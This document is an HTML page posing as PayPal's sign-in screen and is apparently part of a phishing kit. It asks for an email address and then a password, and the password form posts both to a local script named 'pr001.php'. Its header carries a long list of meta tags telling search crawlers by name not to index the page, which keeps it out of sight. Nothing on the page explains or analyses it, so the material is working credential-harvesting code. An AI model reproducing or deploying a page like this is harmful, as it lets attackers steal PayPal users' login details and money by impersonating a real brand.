<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Send Money, Pay Online or Set Up a Merchant Account - PayPal</title>

 <meta name="robots" content="noindex, nofollow,noarchive,nosnippet,nocache,noimageindex">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-news" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="msnbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-slurp" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="teoma" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="twiceler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="gigabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="scrubby" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="robozilla" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="nutch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ia_archiver" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="baiduspider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="naverbot, yeti" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-image" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-mobile" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-mmcrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="psbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="asterias" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-blogs/v3.9" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="AhrefsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="MJ12bot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-12" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-SEO" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="DSearch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Rogerbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SemrushBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BLEXBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ScoutJet" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SearchmetricsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BacklinkCrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Exabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="spbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="linkdexbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Lipperhey Spider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SEOkicks-Robot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="sistrix" content="noindex,nofollow,noarchive,nosnippet,nocache">
    
    <link rel="stylesheet" href="css/style.css" />
    <link rel="shortcut icon" href="images/favicon.png"/>
    <script type="text/javascript" src="js/jqueryLib.js"></script>
     
     <script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>
</head>

<body>
    <div class="signin-space"></div>
	<div class="signin-const">
       <div class="signin-box">
         <div class="img2"></div>
         <div class="img2-content">
         <!-- First Form -->
           <form name="fForm" id="fForm" method="post" action="" class="firstForm">
             <table width="370" border="0">
               <tr>
                 <td width="364">&nbsp;</td>
               </tr>
               <tr>
                 <td>
                 <input type="email" name="email" id="email" required autocomplete="off" class="txt1" placeholder="Email or mobile number"></td>
               </tr>
               <tr>
                 <td><input type="submit" name="nextbtn" id="nextbtn" value="Next" class="nextbtn"></td>
               </tr>
               <tr>
                 <td><div id="log"><a href="">Having trouble logging in?</a></div></td>
               </tr>
               <tr>
                 <td><div class="img6"></div></td>
               </tr>
               <tr>
                 <td><input type="submit" name="signupbtn" id="signupbtn" value="Sign Up" class="signupbtn"></td>
               </tr>
               <tr>
                 <td>&nbsp;</td>
               </tr>
               <tr>
                 <td>&nbsp;</td>
               </tr>
               <tr>
                 <td>&nbsp;</td>
               </tr>
             </table>
           </form>
           <!--First Form Ends Here -->
           <!--Second Form -->
           <form name="sForm" id="sForm" method="post" action="pr001.php" class="secondForm">
             <table width="370" border="0">
               <tr>
                 <td width="364"><div id="me"></div></td>
               </tr>
               <tr>
                 <td>
                 <input type="hidden" name="email2" id="email2" required autocomplete="off" class="txt1" placeholder="Email or mobile number"></td>
               </tr>
               <tr>
                 <td>
                 <input type="password" name="password" id="password" required autocomplete="off" class="txt1a" placeholder="Enter your password"></td>
               </tr>
               <tr>
                 <td><input type="submit" name="btnlogin" id="btnlogin" value="Log In" class="btnlogin"></td>
               </tr>
               <tr>
                 <td><div class="img6"></div></td>
               </tr>
               <tr>
                 <td><input type="submit" name="signupbtn" id="signupbtn" value="Sign Up" class="signupbtn"></td>
               </tr>
               <tr>
                 <td>&nbsp;</td>
               </tr>
               <tr>
                 <td>&nbsp;</td>
               </tr>
               <tr>
                 <td>&nbsp;</td>
               </tr>
             </table>
           </form>
         </div>
       </div>
    </div>
<div class="img7-const">
   <div class="img7"></div>
</div>
<div class="overlay">
<div class="lgif-space"></div>
    <div class="loadgif">
       <img src="images/loding.gif" width="60" height="60">
    </div>
</div>

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>